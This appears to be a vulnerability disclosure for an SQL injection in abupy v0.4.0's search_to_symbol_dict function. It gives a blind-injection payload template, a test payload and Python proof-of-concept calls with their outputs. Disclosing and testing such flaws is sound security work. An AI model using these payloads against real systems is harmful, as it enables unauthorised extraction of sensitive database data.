Vulnerability Product: abupy v0.4.0  
Vulnerability version: v0.4.0  
Vulnerability type: SQL Injection  
Vulnerability Details:  
Vulnerability location: abupy.MarketBu.ABuSymbol.search_to_symbol_dict

SQL Injection in abupy v0.4.0 causes arbitrary SQL code execution 

## [](#header-3)PROVE: 

Payload: ```"us10101' union select case when {code you wanna execute} then 'usJASNW' else 'usTROVW' end where ''='"```  
Test_payload: ```"us10101' union select case when sqlite_version() = '3.31.1' then 'usJASNW' else 'usTROVW' end where ''='"```  
Usage: ```abupy.MarketBu.ABuSymbol.search_to_symbol_dict("us10101' union select case when sqlite_version() = '3.31.1' then 'usJASNW' else 'usTROVW' end where ''='")```  

Firstly download abupy latest version(v0.4.0)
```
pip install abupy
```

Secondly import abupy.MarketBu.ABuSymbol, and call abupy.MarketBu.ABuSymbol.search_to_symbol_dict with test_payload as argument(abupy.MarketBu.ABuSymbol.search_to_symbol_dict is a functional api which author mentioned in the comments of the function, It is legal and normal for users to call this function)
```py
import abupy.MarketBu.ABuSymbol
print(abupy.MarketBu.ABuSymbol.search_to_symbol_dict("us10101' union select case when sqlite_version() = '3.31.1' then 'usJASNW' else 'usTROVW' end where ''='"))
```

Finally you can find the result is `{'JASNW': 'JASON INDS INC'}`  
if you replace `sqlite_version() = '3.31.1'` with `sqlite_version() != '3.31.1'`  
you can find the result is`{'TROVW': 'TROVAGENE INC'}`

proved sql code execution

## [](#header-3)HARM: 

Programmers may mistakenly use the functions in this library as part of the backend of the web application, allowing attackers to call the functions and return sensitive database data.  

The above payload is just an example, attackers can construct payload to obtain complete database sensitive information in a way similar to sql blind injection

discovered by leeya_bug
